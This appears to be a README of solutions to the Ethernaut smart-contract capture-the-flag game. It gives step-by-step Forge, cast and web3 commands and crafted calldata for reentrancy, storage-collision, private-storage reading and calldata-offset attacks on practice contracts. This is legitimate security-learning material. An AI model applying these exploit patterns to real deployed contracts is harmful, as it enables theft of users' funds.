# Ethernaut

Solutions for some of the levels in the [Ethernaut](https://ethernaut.openzeppelin.com/) CTF game.<br>
Original source code copied from the [Ethernaut GitHub](https://github.com/OpenZeppelin/ethernaut/tree/master) and sometimes modified to fit the Foundry testing environment.<br>
All original source code licensed under [MIT license](./LICENSE).

```shell
export SEPOLIA_RPC_URL="..." #  https://chainlist.org/chain/11155111
export LOCAL_RPC_URL='http://localhost:8545'
```

Linking the `ethernaut` repo as a Forge package:

```shell
forge install https://github.com/OpenZeppelin/ethernaut
unlink ./04_Blockchain_for_Security_Tester/ethernaut/lib/ethernaut/client/src/contracts
```

Then fix the [remappings.txt](./remappings.txt) (autodetect doesn't work correctly in current (0.2.0 dbc48ea) Forge version). This is not perfect solution as there will be strange collisions if you try importing some contracts like `Ethernaut.sol`

## Fallback

```js
await contract.contribute.sendTransaction({ value: toWei("0.00001") });
await contract.getContribution().then(result => result.toString()); // convert from BigNumber object
await contract.sendTransaction({ value: toWei("0.00001") }); // fallback
await contract.withdraw()
```

---

## Coin Flip

### Test

```shell
$ forge test -vvv --match-path "test/AttackCoinFlip*"
```

### Deploy

```shell
$ forge create \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --constructor-args $ADDRESS_CoinFlip '57896044618658097711785492504343953926634992332820282019728792003956564819968' \
    --interactive \
    src/AttackCoinFlip.sol:AttackCoinFlip
```

### Cast

```shell
export ADDRESS_AttackCoinFlip=0x...;
# Build the transaction to call the `attack()` function in the `AttackCoinFlip` contract
$ cast mktx \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --value 0.0001ether \
    --interactive \
    "$ADDRESS_AttackCoinFlip" \
    "attack()"
$ cast publish \
    --rpc-url "$SEPOLIA_RPC_URL" \
    <tx>
# Or we can build and publish the transaction in one command
$ cast send \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --value 0.0001ether \
    --interactive \
    "$ADDRESS_AttackCoinFlip" \
    "attack()"
# Finishing the attack and destroying the contract
$ cast send \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --interactive \
    "$ADDRESS_AttackCoinFlip" \
    "finish()"
```

---

## Telephone

### Test

```shell
$ forge test -vvv --match-path "test/AttackTelephone*"
```

### Deploy

```shell
$ forge create \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --constructor-args $ADDRESS_Telephone \
    --interactive \
    src/AttackTelephone.sol:AttackTelephone
```

---

## Token

```shell
# Local testing
$ anvil --fork-url=$SEPOLIA_RPC_URL
```

```js
# We're the owners of the contract. Let's check our balance
await contract.balanceOf(player).then(result => result.toString());
# Transferring amount + 1 to any address
await contract.transfer("0x0000000000000000000000000000000000000000", 21)
```

---

## Delegation

### Test

```shell
$ forge test -vvv --match-path "test/Delegation*"
```

### Attack

```js
var methodId = web3.utils.sha3('pwn()').substring(0, 10);
var txData = {
    from: player,
    to: instance,
    data: methodId, // No parameters, so the data is just the method ID
};

web3.eth.sendTransaction(txData)
.then(receipt => {
    console.log('Transaction receipt:', receipt);
})
.catch(error => {
    console.error('Error sending transaction:', error);
});
```

---

## Force

### Test

```shell
$ forge test -vvv --match-path "test/Force*"
```

### Deploy

```shell
$ forge create \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --interactive \
    src/AttackForce.sol:AttackForce
```

### Attack

```shell
cast mktx \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --value 1wei \
    --interactive \
    "$ADDRESS_AttackForce" \
    "attack(address)" "$ADDRESS_Force"
```

---

## Vault

### Attack

```shell
cast storage --rpc-url $SEPOLIA_RPC_URL "0x..." 1
```

same as

```js
await web3.eth.getStorageAt(contract.address, 1) 
```

---

## King

### Test

```shell
$ forge test -vvv --match-path "test/AttackKing*"
```

### Attack

```shell
$ forge create \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --interactive \
    src/AttackKing.sol:AttackKing
$ cast send \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --value 1000001gwei \
    --interactive \
    "$ADDRESS_AttackKing" \
    "attack(address)" "$ADDRESS_King"
```

---

## Reentrance

### Test

```shell
$ forge test -vvv --match-path "test/AttackReentrance*"
```

### Attack

```shell
$ forge create \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --constructor-args $ADDRESS_Reentrance \
    --interactive \
    src/AttackReentrance.sol:AttackReentrance
# MUST specify gas limit bigger then defaults. Otherwise TX will fail with OutOfGas
$ cast send \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --value 1000000gwei \
    --gas-limit 1200000 \
    --interactive \
    "$ADDRESS_AttackReentrance" \
    "attack()"
$ cast send \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --interactive \
    "$ADDRESS_AttackReentrance" \
    "finish()"
```

---

## Elevator

### Test

```shell
$ forge test -vvv --match-path "test/AttackElevator*"
```

### Attack

```shell
$ forge create \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --interactive \
    src/AttackElevator.sol:AttackElevator
$ cast send \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --interactive \
    "$ADDRESS_AttackElevator" \
    "attack(address)" "$ADDRESS_Elevator"
```

---

## Privacy

### Attack

```shell
for value in {0..6}; do
    cast storage --rpc-url $SEPOLIA_RPC_URL "$ADDRESS_Privacy" $value
done
```

[Privacy.sol](./src/Privacy.sol):

```
0x0000000000000000000000000000000000000000000000000000000000000001 | bool public locked = true;
0x00000000000000000000000000000000000000000000000000000000660c9fcc | uint256 public ID = block.timestamp;
0x000000000000000000000000000000000000000000000000000000009fccff0a | uint8 private flattening = 10;
                                                          ↑↑↑↑↑↑   | uint8 private denomination = 255;
                                                          ||||     | uint16 private awkwardness = uint16(block.timestamp);
                                                                   bytes32[3] private data;
0x41a35571745edb2de223b7ff7173ae044c2f573338595cd20ee79adc669d30e7 | data[0]
0x415679babaf58e73359ec5a13b393a1ab8146c50634108059b5655f04d4e4101 | data[1]
0x61ad5caa9217c3f5e5a84a167e9c17e67bb58951d2fbfafc513f220b2746c242 | data[2]
```

Finding the `_key`:

```
                data[2] = 0x61ad5caa9217c3f5e5a84a167e9c17e67bb58951d2fbfafc513f220b2746c242
_key = bytes16(data[2]) = 0x61ad5caa9217c3f5e5a84a167e9c17e6
```

---

## GatekeeperOne

### Test

Gas value for the second gate could either be brute-forced or lookup in fork-based testing env. Source code in deployed forked contract is not available, so you would need to find the following stack trace:

```
<This is check in the the first gate>
CALLER
ORIGIN
EQ
ISZERO
<And shortly after that find this:>
GAS <- this opcode is part of gasleft() and it will place the remaining gas in the stack.
```


```shell
$ forge test -vvv --match-path "test/AttackGatekeeperOne*"
```

### Attack

Make sure to specify enough gas so the attacking contract would be able to pass the correct amount of gas to the `GatekeeperOne` function. Otherwise it will send what's left from the call, which is not enough.

```shell
$ forge create \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --interactive \
    src/AttackGatekeeperOne.sol:AttackGatekeeperOne
$ cast send \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --gas-limit 90000 \
    --interactive \
    "$ADDRESS_AttackGatekeeperOne" \
    "attack(address,uint256)" "$ADDRESS_GatekeeperOne" 24829
```

---

## GatekeeperTwo

### Test

```shell
forge test -vvvv --match-contract="AttackGatekeeperTwoTest"
```

### Attack

```shell
$ forge create \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --constructor-args "$ADDRESS_GatekeeperTwo" \
    --interactive \
    src/AttackGatekeeperTwo.sol:AttackGatekeeperTwo
---

## Preservation

[AttackPreservation.sol](./src/AttackPreservation.sol)

### Test

```shell
$ forge test -vvv --match-path "test/AttackPreservation*"
```

### Attack

```shell
$ forge create \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --interactive \
    --json \
    src/AttackPreservation.sol:AttackPreservation | tee | jq '.deployedTo' | export ADDRESS_AttackPreservation=$(cat)
$ cast send \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --interactive \
    "$ADDRESS_Preservation" \
    "setFirstTime(uint256)" "0x000000000000000000000000<ADDRESS_AttackPreservation>"
$ cast send \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --interactive \
    "$ADDRESS_Preservation" \
    "setFirstTime(uint256)" "0x000000000000000000000000<ADDRESS_Attacker>"
```

---

## Puzzle Wallet

### Storage layout

| Slot | PuzzleProxy variable | PuzzleWallet variable | Initial value|
| --- | --- | --- | --- |
| 0 | address pendingAdmin | address owner | _Level address_ |
| 1 | address admin | uint256 maxBalance | _Level address_ |
| _IMPLEMENTATION_SLOT | address implementation | - | _PuzzleWallet address_ |

### Attack

1. As we have a storage collision, we can become the _Wallet_ owner by setting the `pendingAdmin` in the _Proxy_ to our address;
2. To become the _Proxy_ `admin` we need to set the _Wallet_ `maxBalance` to our address.
    1. This is possible only if we drain funds from the contract first. The way to do that is to call `deposit()` a few times in the single `multicall(bytes[])` call.
    2. Finally, we need to bypass the `depositCalled` flag check. This can be done by using nested call to the `multicall` inside the `multicall`.

See more in the final [AttackPuzzleWallet script](./script/AttackPuzzleWallet.s.sol) or [tests](./test/PuzzleWallet.t.sol).

```shell
$ cast sig "deposit()"
0xd0e30db0

$ cast calldata "multicall(bytes[])" "[0xd0e30db0]"
0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000

# This calldata will execute nested multicall() with deposit() and then regular deposit() thus using the same msg.value twice.
$ cast pretty-calldata --offline $(cast calldata "multicall(bytes[])" \
"[\
0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000,\
0xd0e30db0\
]")

$ export PRIVATE_KEY="0x...";
$ forge script --rpc-url=$SEPOLIA_RPC_URL --broadcast AttackPuzzleWallet
```

---

## Switch

### Useful resources

- https://docs.soliditylang.org/en/v0.8.19/abi-spec.html#examples
- https://r4bbit.substack.com/p/abi-encoding-and-evm-calldata
- https://www.evm.codes/#37 | CALLDATACOPY

| Function | Selector |
| --- | --- |
| `turnSwitchOff()` | 0x20606e15 |
| `turnSwitchOn()` | 0x76227e12 |
| `flipSwitch(bytes)` | 0x30c13ade |

### Kill chain

1. Call the `flipSwitch(bytes memory _data)` as it's the only public function;
2. Passing the `onlyOff` modifier - calldata bytes 68-71 should be the `turnSwitchOff()` function selector. This corresponds to the `_data[0]` bytes array in the calldata with the default offset of 32 bytes;
3. Finally, the `_data` also should be a valid calldata and `_data[0]` should start with `turnSwitchOn()` function selector.
4. Calldata mapping in normal case for the `flipSwitch(bytes memory _data)` function:
```
4 bytes - function selector | word (32 bytes) - offset of the byte stream start | word - length of the _data | word * X - _data, in word sized chunks
```
this yeilds the following calldata:
```
0x30c13ade | 0000000000000000000000000000000000000000000000000000000000000020 | 0000000000000000000000000000000000000000000000000000000000000004 | 76227e1200000000000000000000000000000000000000000000000000000000
```
EVM will understand if we modify the data start offset, however the `onlyOff` modifier has a hardcoded offset. We can exploit that to trick the check. See the code to assemble the _calldata with `abi.encodePacked` in [Switch.t.sol](./test/Switch.t.sol). For example:
```
0x30c13ade | 0000000000000000000000000000000000000000000000000000000000000060 | 0000000000000000000000000000000000000000000000000000000000000000 | 20606e1500000000000000000000000000000000000000000000000000000000 | 0000000000000000000000000000000000000000000000000000000000000004 | 76227e1200000000000000000000000000000000000000000000000000000000
```

### Test

```
$ forge test -vvvv --match-contract="SwitchTest"
```

### Attack

```shell
$ await sendTransaction({from: player, to: instance, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
```
